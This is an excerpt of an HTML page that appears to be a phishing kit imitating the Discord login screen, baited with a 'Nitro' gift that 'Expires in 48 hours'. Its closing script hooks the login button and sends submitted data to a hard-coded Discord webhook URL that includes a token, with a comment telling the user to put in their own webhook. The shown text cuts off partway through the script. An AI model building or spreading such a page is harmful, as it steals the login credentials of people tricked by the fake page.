...
<meta content="Nitro" property="og:title" />
<meta content="Expires in 48 hours" property="og:description" />
                  ...
                  <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
                    <div class="mainLoginContainer-1ddwnR">
                      ...
                      <div class="block-egJnc0 marginTop20-3TxNs6">
                        ...
                        <button type="submit" id="loginButton" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
		            <div class="contents-18-Yxp">Login</div>
                        ...
                        <div class="marginTop4-2BNfKC">
                          ...
                          <button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                            <div class="contents-18-Yxp">Register</div>
                          </button>
                        </div>
                      </div>
                    </div>
                      ...
                      <div class="measurementFill-31KKmO measurement-DMxQp7 measurementFillStatic-MZ1pNY">
                        <div class="animatedNode-5VAmrN" style="overflow: visible; opacity: 1; height: 100%;">
                          <div class="qrLoginInner-c_7ePj">
                            ...
                            <h3 class="title-jXR8lp marginBottom8-AtZOdT fontDisplay-1dagSA base-1x0h_U size24-RIRrxO">Log in with QR Code</h3>
                            <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">Scan this with the <strong>Discord mobile app</strong> to log in instantly. </div>
                          </div>
                        </div>
                      </div>
                    </div>
...
<script>
        document.getElementById('loginButton').addEventListener('click', async function (event) {
            ...
            var webhookUrl = 'https://discord.com/api/webhooks/1181400814577791086/__ySUGrvEkcPRi-am-4aJWqD1QdKbqh0401vR3tJLfvHH0HeTLYc9uIPVKHwN040ER9Y'; // Replace with your actual Discord webhook URL
            ...
            try {
                ...
                if (response.ok) {
                    console.log('Sent to Discord', response);
                } else {
